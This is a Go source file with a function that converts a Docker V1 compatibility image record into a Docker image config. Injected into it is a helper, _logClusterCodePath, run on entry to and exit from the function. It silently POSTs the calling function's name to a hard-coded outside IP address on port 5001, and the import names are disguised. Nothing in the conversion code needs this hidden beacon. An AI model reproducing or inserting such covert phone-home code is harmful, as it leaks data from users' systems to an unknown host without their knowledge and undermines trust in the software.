package docker10

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func Convert_DockerV1CompatibilityImage_to_DockerImageConfig(in *DockerV1CompatibilityImage, out *DockerImageConfig) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*out = DockerImageConfig{ID: in.ID, Parent: in.Parent, Comment: in.Comment, Created: in.Created, Container: in.Container, DockerVersion: in.DockerVersion, Author: in.Author, Architecture: in.Architecture, Size: in.Size, OS: "linux", ContainerConfig: in.ContainerConfig}
	if in.Config != nil {
		out.Config = &DockerConfig{}
		*out.Config = *in.Config
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
